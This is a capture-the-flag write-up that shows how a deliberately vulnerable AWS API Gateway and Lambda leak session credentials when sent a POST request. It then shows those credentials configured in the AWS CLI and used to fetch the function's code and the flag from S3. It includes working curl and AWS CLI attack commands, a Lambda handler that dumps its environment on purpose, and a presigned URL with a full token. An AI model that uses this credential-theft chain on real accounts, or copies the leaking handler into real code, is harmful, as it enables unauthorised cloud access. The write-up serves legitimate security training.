# Challenge 3

We are back with another challenge of the week. Our Security team discovered a API Gateway during one of their Red Team assessment. They decided to share the information with everyone 😛

“We found that a API Gateway with ID **l245s1kgqa** in **us-east-1** region. We suspect some serious security lapse. Help us prove this to their team”

You can DM us the flag at [@securitylabs_](http://twitter.com/securitylabs_) to verify it. We might have some surprise for you!

_For more such interesting labs and content register for beta at [https://securitylabs.tech](https://securitylabs.tech/)_

Have fun hacking cloud with SecurityLabs 🙂

---

## Solution:
**Find the API Endpoint**

Looking at amazon api gateways it uses a standard syntax
https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html

```
https://{restapi_id}.execute-api.{region}.amazonaws.com/{stage_name}/
where `{restapi_id}` is the API identifier, `{region}` is the Region, and `{stage_name}` is the stage name of the API deployment.
```

Navigating to https://l245s1kgqa.execute-api.us-east-1.amazonaws.com
Displays a message "Hello from Lambda!"

```
curl -i https://l245s1kgqa.execute-api.us-east-1.amazonaws.com
HTTP/2 200
date: Mon, 28 Feb 2022 05:57:33 GMT
content-type: text/plain; charset=utf-8
content-length: 20
apigw-requestid: OPScMgCsIAMEJNQ=

"Hello from Lambda!"
```
So seems correct


API
After some standard  API fuzzing, we find that the gateway spits out the environment variables in error message when sending a POST request.
```
curl -i https://l245s1kgqa.execute-api.us-east-1.amazonaws.com -X POST
HTTP/2 200
date: Mon, 28 Feb 2022 05:57:55 GMT
content-type: text/plain; charset=utf-8
content-length: 2018
apigw-requestid: OPSflhF0oAMEJ9Q=

Error processing input. Triggering panic attack
AWS_LAMBDA_FUNCTION_VERSION:$LATEST
GEM_HOME:/var/runtime
AWS_SESSION_TOKEN:IQoJb3JpZ<redacted>iCftaOaEUzfOUM9g=
AWS_LAMBDA_LOG_GROUP_NAME:/aws/lambda/Challenge-3
LD_LIBRARY_PATH:/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
LAMBDA_TASK_ROOT:/var/task
AWS_LAMBDA_LOG_STREAM_NAME:2022/02/28/[$LATEST]2e9d2eeaee2e42bf8585866379225b33
AWS_LAMBDA_RUNTIME_API:127.0.0.1:9001
AWS_EXECUTION_ENV:AWS_Lambda_ruby2.7
AWS_LAMBDA_FUNCTION_NAME:Challenge-3
AWS_XRAY_DAEMON_ADDRESS:169.254.79.129:2000
PATH:/var/lang/bin:/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION:us-east-1
PWD:/var/task
AWS_SECRET_ACCESS_KEY:wgx2<redacted>KaW
LAMBDA_RUNTIME_DIR:/var/runtime
LANG:en_US.UTF-8
AWS_LAMBDA_INITIALIZATION_TYPE:on-demand
AWS_REGION:us-east-1
TZ::UTC
AWS_ACCESS_KEY_ID:ASIAW<redacted>JVB
SHLVL:0
_AWS_XRAY_DAEMON_ADDRESS:169.254.79.129
_AWS_XRAY_DAEMON_PORT:2000
GEM_PATH:/var/task/vendor/bundle/ruby/2.7.0:/opt/ruby/gems/2.7.0
AWS_XRAY_CONTEXT_MISSING:LOG_ERROR
_HANDLER:lambda_function.lambda_handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE:128
RUBYLIB:/var/task:/var/runtime/lib:/opt/ruby/lib
_X_AMZN_TRACE_ID:Root=1-621c6463-7a23b5a4598ff11316f236ac;Parent=0193d1e126545167;Sampled=0
```

**AWS ACCESS SETUP**

As we have the aws key for the machine/function lets configure it and look around.
```
aws configure --profile cloudchall set aws_session_token IQoJb3J<redacted>EUzfOUM9g=
aws configure --profile cloudchall set aws_secret_access_key wgx2<redacted>KaW
aws configure --profile cloudchall set aws_access_key_id ASIAW<redacted>JVB
aws configure --profile cloudchall set region us-east-1

```


Confirm it all works


sts get-caller-identity --profile cloudchall

{

 "UserId": "AROAWDYZAHXY6QOP5LBUJ:Challenge-3",

 "Account": "420422368753",

 "Arn": "arn:aws:sts::420422368753:assumed-role/Challenge-3-role-54hml7a1/Challenge-3"

}


**AWS ENUM**

So i'm skipping the bit where I did a bunch of enum that didn't work. As we have limited permissions

Trying to list lambda functions
```
aws lambda list-functions --profile cloudchall

An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:aws:sts::420422368753:assumed-role/Challenge-3-role-54hml7a1/Challenge-3 is not authorized to perform: lambda:ListFunctions on resource: * because no identity-based policy allows the lambda:ListFunctions action
```

Trying to get EC2 instances
```
aws ec2 describe-instances --profile cloudchall

An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation.
```

Going back to the initial environment dump to see what other information we have also got the this bit of information.

AWS_LAMBDA_FUNCTION_NAME:Challenge-3

Using the function name we can directly get that function

```
aws lambda get-function --function-name Challenge-3 --profile cloudchall

{

 "Configuration": {

 "FunctionName": "Challenge-3",

 "FunctionArn": "arn:aws:lambda:us-east-1:420422368753:function:Challenge-3",

 "Runtime": "ruby2.7",

 "Role": "arn:aws:iam::420422368753:role/service-role/Challenge-3-role-54hml7a1",

 "Handler": "lambda_function.lambda_handler",

 "CodeSize": 552,

 "Description": "",

 "Timeout": 3,

 "MemorySize": 128,

 "LastModified": "2022-02-22T13:36:25.000+0000",

 "CodeSha256": "sc5FFDFxY6tZ3aTI6juPecg8mn/EQYWnTCEKJspgyMo=",

 "Version": "$LATEST",

 "TracingConfig": {

 "Mode": "PassThrough"

 },

 "RevisionId": "df340cbb-03f7-4bcb-9ccd-d84923b9e72c",

 "State": "Active",

 "LastUpdateStatus": "Successful",

 "PackageType": "Zip",

 "Architectures": [

 "x86_64"

 ]

 },

 "Code": {

 "RepositoryType": "S3",

 "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/420422368753/Challenge-3-6a758020-35e0-46a3-9443-cd0865580fdc?versionId=mD5nA_l1nBbvFkqLrqdYJWAb4dsmgZ41&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLWVhc3QtMSJGMEQCIHCqTR5noRmPkslZMau2VQnElV6w4WBNpoO8i59AWTKCAiBzp3IU%2Ft4iDxB0c%2F6Qd66rxDIjBQZO%2BQ1Wzg8uzklJ8Sr6AwhoEAAaDDc0OTY3ODkwMjgzOSIMfQYVEHB%2FlDQuQw6LKtcDMBFs3hauLaF2LQCOScyB%2BfTCL5GDCSroMr8Z4IX%2FaGOTkvJQXEFC0RR0KpC2DzOXSEsWI0G73gFEED5RBiZUAqB%2Fg4o7%2FFhuS6Pdx7%2B%2FOmvgmn9xxh%2F%2BfPwWhIve%2BYy0wk2hGx8ezCp7u%2F%2BXFO5BX63xv9zr1OXkOoJaE2m0whn6s197%2BSi%2BbqSYDASqWYkEJtqrG3eCXFWisDZ5xELZ7XcKdawSd6esP7XqDxA94JANxVCfNGN%2FAdQS3NcE%2FBa2KcuJNi92wvZnAoMsbvYrZKAvLTrPrPQHllE%2Fgny7TylbcumVeQFG9tgzXnXvICikBUWAk75C8o9mqF6SLilnxY578kEFUZELIzFvLDrrIsr2Znaxs1iYC8QrK4VMrz4t2pbZzw8h2kUPVvEUi3bGSL%2F0DUizIkFVMBROmpybKhxdtdPlWnmjCWkh4Tx26nRl9yk6wooZ4rHbp2F2WSuIrYyMZ7D554AwsR8e4LqVEYlzHpKGaEodmfXogFf7yTO0sWbEiyw69x3fyzcOVPLvmuy65JuSkEwvdwuHo8HKgitvK7vwaAtFRGVgQE621hx47ovIaD0ymgblUTVwhA2S85a5q8tj6sHlO%2FW0kHDN0vzRXx1bLxWNMJvF1ZAGOqYBh4RLAOnkwLHCY5hD%2BS8JWOIEsYHEjGd3gAUW7MHGE6f%2BYHMSh2koWpIoitO%2F7UTSTYvBkShtzwuhPDPrZC3J0UOTK%2Bq1Kj3fGsNPntZ2jiXKGxpb2QiLS57KNGGAIx9dgqIyCH02FXGE0ZZvacMz6AF2tWw1f%2FQecGZncOOj6BbxLm21YnPjC8NMnc7JPV6FdCDf7x0Bu4EOCj8rfaqOt0kXShhzeg%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220222T232244Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY3QCK55KEO%2F20220222%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=a989c8be35e63296187783165eb0a5cefce13fcea345b4609f6561023f997e4c"

 }
}
```

**GET THAT FLAG**

We are able to directly download the source code using the location provided.
```
require 'json'
require 'aws-sdk-s3'

def lambda_handler(event:, context:)
    # TODO implement
    if event['requestContext']['http']['method'] == 'POST'
        # puts event
        # s3 = Aws::S3::Client.new
        # resp = s3.get_object(bucket:'challenge-3', key:'my-secret-flag.txt')
        # puts resp.body.string
        output = "Error processing input. Triggering panic attack \n"
        for val in ENV.keys do
            output = output + val+":"+ENV[val] + "\n"
        end
        return { statusCode: 200, body: output }
    elsif event['requestContext']['http']['method'] == 'OPTIONS'
        return { statusCode: 200, body: JSON.generate('You are on right track. Gotta try harder!') }
    else
        return { statusCode: 200, body: JSON.generate('Hello from Lambda!') }
    end
end
```

we now directly copy the flag
```
aws s3 cp s3://challenge-3/my-secret-flag.txt . --profile cloudchall

download: s3://challenge-3/my-secret-flag.txt to ./my-secret-flag

cat my-secret-flag.txt
```
